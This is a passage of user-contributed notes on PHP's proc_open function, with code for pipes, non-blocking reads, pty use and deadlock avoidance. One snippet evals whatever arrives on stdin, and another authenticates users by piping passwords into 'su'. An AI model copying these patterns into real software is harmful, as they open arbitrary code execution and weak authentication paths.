&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$line </span><span class="keyword">= </span><span class="default">fread</span><span class="keyword">(</span><span class="default">$pipe</span><span class="keyword">, </span><span class="default">128</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; if(</span><span class="default">$line</span><span class="keyword">) {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; print(</span><span class="default">$line</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">log</span><span class="keyword">(</span><span class="default">$line</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">sleep</span><span class="keyword">(</span><span class="default">0.5</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; }<br />
...<br />
</span><span class="default">?&gt;<br />
</span><br />
everything works fine.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="82130""></a>
  <div class="note">
   <strong class="user">jaroslaw at pobox dot sk</strong>
   <a href="#82130" class="date">28-Mar-2008 02:15</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
Some functions stops working proc_open() to me.<br />
This i made to work for me to communicate between two php scripts:<br />
<br />
<span class="default">&lt;?php<br />
$abs_path </span><span class="keyword">= </span><span class="string">'/var/www/domain/filename.php'</span><span class="keyword">;<br />
</span><span class="default">$spec </span><span class="keyword">= array(array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"r"</span><span class="keyword">), array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"w"</span><span class="keyword">), array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"w"</span><span class="keyword">)); <br />
</span><span class="default">$process </span><span class="keyword">= </span><span class="default">proc_open</span><span class="keyword">(</span><span class="string">'php '</span><span class="keyword">.</span><span class="default">$abs_path</span><span class="keyword">, </span><span class="default">$spec</span><span class="keyword">, </span><span class="default">$pipes</span><span class="keyword">, </span><span class="default">null</span><span class="keyword">, </span><span class="default">$_ENV</span><span class="keyword">); <br />
if (</span><span class="default">is_resource</span><span class="keyword">(</span><span class="default">$process</span><span class="keyword">)) {<br />
&nbsp;&nbsp;&nbsp; </span><span class="comment"># wait till something happens on other side<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">sleep</span><span class="keyword">(</span><span class="default">1</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; </span><span class="comment"># send command<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">fwrite</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">], </span><span class="string">'echo $test;'</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">fflush</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">]);<br />
&nbsp;&nbsp;&nbsp; </span><span class="comment"># wait till something happens on other side<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">usleep</span><span class="keyword">(</span><span class="default">1000</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; </span><span class="comment"># read pipe for result<br />
&nbsp;&nbsp;&nbsp; </span><span class="keyword">echo </span><span class="default">fread</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">],</span><span class="default">1024</span><span class="keyword">).</span><span class="string">'&lt;hr&gt;'</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; </span><span class="comment"># close pipes<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">]);</span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">]);</span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">2</span><span class="keyword">]);<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$return_value </span><span class="keyword">= </span><span class="default">proc_close</span><span class="keyword">(</span><span class="default">$process</span><span class="keyword">);<br />
}<br />
</span><span class="default">?&gt;<br />
</span><br />
filename.php then contains this:<br />
<br />
<span class="default">&lt;?php<br />
$test </span><span class="keyword">= </span><span class="string">'test data generated here&lt;br&gt;'</span><span class="keyword">;<br />
while(</span><span class="default">true</span><span class="keyword">) {<br />
&nbsp;&nbsp;&nbsp; </span><span class="comment"># read incoming command<br />
&nbsp;&nbsp;&nbsp; </span><span class="keyword">if(</span><span class="default">$fh </span><span class="keyword">= </span><span class="default">fopen</span><span class="keyword">(</span><span class="string">'php://stdin'</span><span class="keyword">,</span><span class="string">'rb'</span><span class="keyword">)) {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$val_in </span><span class="keyword">= </span><span class="default">fread</span><span class="keyword">(</span><span class="default">$fh</span><span class="keyword">,</span><span class="default">1024</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$fh</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; </span><span class="comment"># execute incoming command<br />
&nbsp;&nbsp;&nbsp; </span><span class="keyword">if(</span><span class="default">$val_in</span><span class="keyword">)<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; eval(</span><span class="default">$val_in</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">usleep</span><span class="keyword">(</span><span class="default">1000</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; </span><span class="comment"># prevent neverending cycle<br />
&nbsp;&nbsp;&nbsp; </span><span class="keyword">if(</span><span class="default">$tmp_counter</span><span class="keyword">++ &gt; </span><span class="default">100</span><span class="keyword">)<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; break;<br />
}<br />
</span><span class="default">?&gt;</span>
</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="81317""></a>
  <div class="note">
   <strong class="user">chris AT w3style DOT co.uk</strong>
   <a href="#81317" class="date">22-Feb-2008 02:57</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
It took me a long time (and three consecutive projects) to figure this out.&nbsp; Because popen() and proc_open() return valid processes even when the command failed it's awkward to determine when it really has failed if you're opening a non-interactive process like "sendmail -t".<br />
<br />
I had previously guess that reading from STDERR immediately after starting the process would work, and it does... but when the command is successful PHP just hangs because STDERR is empty and it's waiting for data to be written to it.<br />
<br />
The solution is a simple stream_set_blocking($pipes[2], 0) immediately after calling proc_open().<br />
<br />
<span class="default">&lt;?php<br />
<br />
&nbsp;&nbsp;&nbsp; $this</span><span class="keyword">-&gt;</span><span class="default">_proc </span><span class="keyword">= </span><span class="default">proc_open</span><span class="keyword">(</span><span class="default">$command</span><span class="keyword">, </span><span class="default">$descriptorSpec</span><span class="keyword">, </span><span class="default">$pipes</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">stream_set_blocking</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">2</span><span class="keyword">], </span><span class="default">0</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; if (</span><span class="default">$err </span><span class="keyword">= </span><span class="default">stream_get_contents</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">2</span><span class="keyword">]))<br />
&nbsp;&nbsp;&nbsp; {<br />
&nbsp;&nbsp; &nbsp;&nbsp; throw new </span><span class="default">Swift_Transport_TransportException</span><span class="keyword">(<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="string">'Process could not be started [' </span><span class="keyword">. </span><span class="default">$err </span><span class="keyword">. </span><span class="string">']'<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; }<br />
<br />
</span><span class="default">?&gt;<br />
</span><br />
If the process is opened successfully $pipes[2] will be empty, but if it failed the bash/sh error will be in it.<br />
<br />
Finally I can drop all my "workaround" error checking.<br />
<br />
I realise this solution is obvious and I'm not sure how it took me 18 months to figure it out, but hopefully this will help someone else.<br />
<br />
NOTE: Make sure your descriptorSpec has ( 2 =&gt; array('pipe', 'w')) for this to work.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="80064""></a>
  <div class="note">
   <strong class="user">Anonymous</strong>
   <a href="#80064" class="date">27-Dec-2007 07:40</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
I needed to emulate a tty for a process (it wouldnt write to stdout or read from stdin), so I found this:<br />
<br />
<span class="default">&lt;?php<br />
$descriptorspec </span><span class="keyword">= array(</span><span class="default">0 </span><span class="keyword">=&gt; array(</span><span class="string">'pty'</span><span class="keyword">),<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">1 </span><span class="keyword">=&gt; array(</span><span class="string">'pty'</span><span class="keyword">),<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">2 </span><span class="keyword">=&gt; array(</span><span class="string">'pty'</span><span class="keyword">));&nbsp; <br />
</span><span class="default">?&gt;<br />
</span><br />
pipes are bidirectional then</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="79665""></a>
  <div class="note">
   <strong class="user">John Wehin</strong>
   <a href="#79665" class="date">06-Dec-2007 10:52</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
STDIN STDOUT example<br />
test.php<br />
<br />
<span class="default">&lt;?php<br />
$descriptorspec </span><span class="keyword">= array(<br />
&nbsp;&nbsp; </span><span class="default">0 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"r"</span><span class="keyword">), <br />
&nbsp;&nbsp; </span><span class="default">1 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"w"</span><span class="keyword">), <br />
&nbsp;&nbsp; </span><span class="default">2 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"r"</span><span class="keyword">)<br />
);<br />
</span><span class="default">$process </span><span class="keyword">= </span><span class="default">proc_open</span><span class="keyword">(</span><span class="string">'php test_gen.php'</span><span class="keyword">, </span><span class="default">$descriptorspec</span><span class="keyword">, </span><span class="default">$pipes</span><span class="keyword">, </span><span class="default">null</span><span class="keyword">, </span><span class="default">null</span><span class="keyword">); </span><span class="comment">//run test_gen.php<br />
</span><span class="keyword">echo (</span><span class="string">"Start process:\n"</span><span class="keyword">);<br />
if (</span><span class="default">is_resource</span><span class="keyword">(</span><span class="default">$process</span><span class="keyword">)) <br />
{<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">fwrite</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">], </span><span class="string">"start\n"</span><span class="keyword">);&nbsp; &nbsp; </span><span class="comment">// send start<br />
&nbsp;&nbsp;&nbsp; </span><span class="keyword">echo (</span><span class="string">"\n\nStart ...."</span><span class="keyword">.</span><span class="default">fgets</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">],</span><span class="default">4096</span><span class="keyword">)); </span><span class="comment">//get answer<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">fwrite</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">], </span><span class="string">"get\n"</span><span class="keyword">);&nbsp; &nbsp; </span><span class="comment">// send get<br />
&nbsp;&nbsp;&nbsp; </span><span class="keyword">echo (</span><span class="string">"Get: "</span><span class="keyword">.</span><span class="default">fgets</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">],</span><span class="default">4096</span><span class="keyword">));&nbsp; &nbsp; </span><span class="comment">//get answer<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">fwrite</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">], </span><span class="string">"stop\n"</span><span class="keyword">);&nbsp; &nbsp; </span><span class="comment">//send stop<br />
&nbsp;&nbsp;&nbsp; </span><span class="keyword">echo (</span><span class="string">"\n\nStop ...."</span><span class="keyword">.</span><span class="default">fgets</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">],</span><span class="default">4096</span><span class="keyword">));&nbsp; </span><span class="comment">//get answer<br />
<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">]);<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">]);<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">2</span><span class="keyword">]);<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$return_value </span><span class="keyword">= </span><span class="default">proc_close</span><span class="keyword">(</span><span class="default">$process</span><span class="keyword">);&nbsp; </span><span class="comment">//stop test_gen.php<br />
&nbsp;&nbsp;&nbsp; </span><span class="keyword">echo (</span><span class="string">"Returned:"</span><span class="keyword">.</span><span class="default">$return_value</span><span class="keyword">.</span><span class="string">"\n"</span><span class="keyword">);<br />
}<br />
</span><span class="default">?&gt;<br />
</span><br />
test_gen.php<br />
<span class="default">&lt;?php<br />
$keys</span><span class="keyword">=</span><span class="default">0</span><span class="keyword">;<br />
function </span><span class="default">play_stop</span><span class="keyword">()<br />
{<br />
global </span><span class="default">$keys</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$stdin_stat_arr</span><span class="keyword">=</span><span class="default">fstat</span><span class="keyword">(</span><span class="default">STDIN</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; if(</span><span class="default">$stdin_stat_arr</span><span class="keyword">[</span><span class="default">size</span><span class="keyword">]!=</span><span class="default">0</span><span class="keyword">)<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$val_in</span><span class="keyword">=</span><span class="default">fread</span><span class="keyword">(</span><span class="default">STDIN</span><span class="keyword">,</span><span class="default">4096</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; switch(</span><span class="default">$val_in</span><span class="keyword">)<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; case </span><span class="string">"start\n"</span><span class="keyword">:&nbsp; &nbsp; echo </span><span class="string">"Started\n"</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; return </span><span class="default">false</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; break;<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; case </span><span class="string">"stop\n"</span><span class="keyword">:&nbsp; &nbsp; echo </span><span class="string">"Stopped\n"</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$keys</span><span class="keyword">=</span><span class="default">0</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; return </span><span class="default">false</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; break;<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; case </span><span class="string">"pause\n"</span><span class="keyword">:&nbsp; &nbsp; echo </span><span class="string">"Paused\n"</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; return </span><span class="default">false</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; break;<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; case </span><span class="string">"get\n"</span><span class="keyword">:&nbsp; &nbsp; echo (</span><span class="default">$keys</span><span class="keyword">.</span><span class="string">"\n"</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; return </span><span class="default">true</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; break;<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; default:&nbsp; &nbsp; echo(</span><span class="string">"Передан не верный параметр: "</span><span class="keyword">.</span><span class="default">$val_in</span><span class="keyword">.</span><span class="string">"\n"</span><span class="keyword">); <br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; return </span><span class="default">true</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; exit();<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; }else{return </span><span class="default">true</span><span class="keyword">;}<br />
}<br />
while(</span><span class="default">true</span><span class="keyword">)<br />
{<br />
while(</span><span class="default">play_stop</span><span class="keyword">()){</span><span class="default">usleep</span><span class="keyword">(</span><span class="default">1000</span><span class="keyword">);}<br />
while(</span><span class="default">play_stop</span><span class="keyword">()){</span><span class="default">$keys</span><span class="keyword">++;</span><span class="default">usleep</span><span class="keyword">(</span><span class="default">10</span><span class="keyword">);}<br />
}<br />
</span><span class="default">?&gt;</span>
</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="67109""></a>
  <div class="note">
   <strong class="user">php dot net_manual at reimwerker dot de</strong>
   <a href="#67109" class="date">03-Jun-2006 04:47</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
If you are going to allow data coming from user input to be passed to this function, then you should keep in mind the following warning that also applies to exec() and system():<br />
<br />
<a href="http://www.php.net/manual/en/function.exec.php" rel="nofollow" target="_blank">http://www.php.net/manual/en/function.exec.php</a><br />
<a href="http://www.php.net/manual/en/function.system.php" rel="nofollow" target="_blank">http://www.php.net/manual/en/function.system.php</a><br />
<br />
Warning:<br />
<br />
If you are going to allow data coming from user input to be passed to this function, then you should be using escapeshellarg() or escapeshellcmd() to make sure that users cannot trick the system into executing arbitrary commands.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="62663""></a>
  <div class="note">
   <strong class="user">Kevin Barr</strong>
   <a href="#62663" class="date">06-Mar-2006 12:36</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
I found that with disabling stream blocking I was sometimes attempting to read a return line before the external application had responded. So, instead, I left blocking alone and used this simple function to add a timeout to the fgets function:<br />
<br />
// fgetsPending( $in,$tv_sec ) - Get a pending line of data from stream $in, waiting a maximum of $tv_sec seconds<br />
function fgetsPending(&amp;$in,$tv_sec=10) {<br />
&nbsp;&nbsp;&nbsp; if ( stream_select($read = array($in),$write=NULL,$except=NULL,$tv_sec) ) return fgets($in);<br />
&nbsp;&nbsp;&nbsp; else return FALSE;&nbsp; &nbsp; <br />
}</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="60187""></a>
  <div class="note">
   <strong class="user">andrew dot budd at adsciengineering dot com</strong>
   <a href="#60187" class="date">28-Dec-2005 09:55</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
The pty option is actually disabled in the source for some reason via a #if 0 &amp;&amp; condition.&nbsp; I'm not sure why it's disabled.&nbsp; I removed the 0 &amp;&amp; and recompiled, after which the pty option works perfectly.&nbsp; Just a note.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="58044""></a>
  <div class="note">
   <strong class="user">mendoza at pvv dot ntnu dot no</strong>
   <a href="#58044" class="date">21-Oct-2005 10:42</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
Since I don't have access to PAM via Apache, suexec on, nor access to /etc/shadow I coughed up this way of authenticating users based on the system users details. It's really hairy and ugly, but it works.<br />
<br />
&lt;?<br />
function authenticate($user,$password) {<br />
&nbsp; $descriptorspec = array(<br />
&nbsp;&nbsp; &nbsp; 0 =&gt; array("pipe", "r"),&nbsp; // stdin is a pipe that the child will read from<br />
&nbsp;&nbsp; &nbsp; 1 =&gt; array("pipe", "w"),&nbsp; // stdout is a pipe that the child will write to<br />
&nbsp;&nbsp; &nbsp; 2 =&gt; array("file","/dev/null", "w") // stderr is a file to write to<br />
&nbsp; );<br />
<br />
&nbsp; $process = proc_open("su ".escapeshellarg($user), $descriptorspec, $pipes);<br />
<br />
&nbsp; if (is_resource($process)) {<br />
&nbsp;&nbsp;&nbsp; // $pipes now looks like this:<br />
&nbsp;&nbsp;&nbsp; // 0 =&gt; writeable handle connected to child stdin<br />
&nbsp;&nbsp;&nbsp; // 1 =&gt; readable handle connected to child stdout<br />
&nbsp;&nbsp;&nbsp; // Any error output will be appended to /tmp/error-output.txt<br />
<br />
&nbsp;&nbsp;&nbsp; fwrite($pipes[0],$password);<br />
&nbsp;&nbsp;&nbsp; fclose($pipes[0]);<br />
&nbsp;&nbsp;&nbsp; fclose($pipes[1]);<br />
<br />
&nbsp;&nbsp;&nbsp; // It is important that you close any pipes before calling<br />
&nbsp;&nbsp;&nbsp; // proc_close in order to avoid a deadlock<br />
&nbsp;&nbsp;&nbsp; $return_value = proc_close($process);<br />
<br />
&nbsp;&nbsp;&nbsp; return !$return_value;<br />
&nbsp; }<br />
}<br />
?&gt;</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="57857""></a>
  <div class="note">
   <strong class="user">picaune at hotmail dot com</strong>
   <a href="#57857" class="date">16-Oct-2005 04:51</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
The above note on Windows compatibility is not entirely correct.<br />
<br />
Windows will dutifully pass on additional handles above 2 onto the child process, starting with Windows 95 and Windows NT 3.5. It even supports this capability (starting with Windows 2000) from the command line using a special syntax (prefacing the redirection operator with the handle number).<br />
<br />
These handles will be, when passed to the child, preopened for low-level IO (e.g. _read) by number. The child can reopen them for high-level (e.g. fgets) using the _fdopen or _wfdopen methods. The child can then read from or write to them the same way they would stdin or stdout.<br />
<br />
However, child processes must be specially coded to use these handles, and if the end user is not intelligent enough to use them (e.g. "openssl &lt; commands.txt 3&lt; cacert.der") and the program not smart enough to check, it could cause errors or hangs.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="55502""></a>
  <div class="note">
   <strong class="user">Kyle Gibson</strong>
   <a href="#55502" class="date">05-Aug-2005 12:16</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
proc_open is hard coded to use "/bin/sh". So if you're working in a chrooted environment, you need to make sure that /bin/sh exists, for now.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="38870""></a>
  <div class="note">
   <strong class="user">ralf at dreesen[*NO*SPAM*] dot net</strong>
   <a href="#38870" class="date">09-Jan-2004 11:49</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
The behaviour described in the following may depend on the system php runs on. Our platform was "Intel with Debian 3.0 linux".<br />
<br />
If you pass huge amounts of data (ca. &gt;&gt;10k) to the application you run and the application for example echos them directly to stdout (without buffering the input), you will get a deadlock. This is because there are size-limited buffers (so called pipes) between php and the application you run. The application will put data into the stdout buffer until it is filled, then it blocks waiting for php to read from the stdout buffer. In the meantime Php filled the stdin buffer and waits for the application to read from it. That is the deadlock.<br />
<br />
A solution to this problem may be to set the stdout stream to non blocking (stream_set_blocking) and alternately write to stdin and read from stdout.<br />
<br />
Just imagine the following example:<br />
<br />
&lt;?<br />
/* assume that strlen($in) is about 30k<br />
*/<br />
<br />
$descriptorspec = array(<br />
&nbsp;&nbsp; 0 =&gt; array("pipe", "r"),<br />
&nbsp;&nbsp; 1 =&gt; array("pipe", "w"),<br />
&nbsp;&nbsp; 2 =&gt; array("file", "/tmp/error-output.txt", "a")<br />
);<br />
<br />
$process = proc_open("cat", $descriptorspec, $pipes);<br />
<br />
if (is_resource($process)) {<br />
&nbsp;<br />
&nbsp;&nbsp; fwrite($pipes[0], $in);<br />
&nbsp;&nbsp;&nbsp; /* fwrite writes to stdin, 'cat' will immediately write the data from stdin<br />
&nbsp;&nbsp;&nbsp; * to stdout and blocks, when the stdout buffer is full. Then it will not<br />
&nbsp;&nbsp;&nbsp; * continue reading from stdin and php will block here.<br />
&nbsp;&nbsp;&nbsp; */<br />
<br />
&nbsp;&nbsp; fclose($pipes[0]);<br />
<br />
&nbsp;&nbsp; while (!feof($pipes[1])) {<br />
&nbsp;&nbsp; &nbsp; &nbsp; $out .= fgets($pipes[1], 1024);<br />
&nbsp;&nbsp; }<br />
&nbsp;&nbsp; fclose($pipes[1]);<br />
<br />
&nbsp;&nbsp; $return_value = proc_close($process);<br />
}<br />
?&gt;</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="38496""></a>
  <div class="note">
   <strong class="user">MagicalTux at FF.ST</strong>
   <a href="#38496" class="date">24-Dec-2003 04:20</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
Note that if you need to be "interactive" with the user *and* the opened application, you can use stream_select to see if something is waiting on the other side of the pipe.<br />
<br />
Stream functions can be used on pipes like :<br />
&nbsp;- pipes from popen, proc_open<br />
&nbsp;- pipes from fopen('php://stdin') (or stdout)<br />
&nbsp;- sockets (unix or tcp/udp)<br />
&nbsp;- many other things probably but the most important is here<br />
<br />
More informations about streams (you'll find many useful functions there) :<br />
<a href="http://www.php.net/manual/en/ref.stream.php" rel="nofollow" target="_blank">http://www.php.net/manual/en/ref.stream.php</a></span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="31276""></a>
  <div class="note">
   <strong class="user">daniela at itconnect dot net dot au</strong>
   <a href="#31276" class="date">16-Apr-2003 02:01</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
Just a small note in case it isn't obvious, its possible to treat the filename as in fopen, thus you can pass through the standard input from php like<br />
&nbsp;&nbsp;&nbsp; $descs = array (<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; 0 =&gt; array ("file", "php://stdin", "r"),<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; 1 =&gt; array ("pipe", "w"),<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; 2 =&gt; array ("pipe", "w")<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; );<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; $proc = proc_open ("myprogram", $descs, $fp);</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
</div>
</div>
</div></div></body></html>
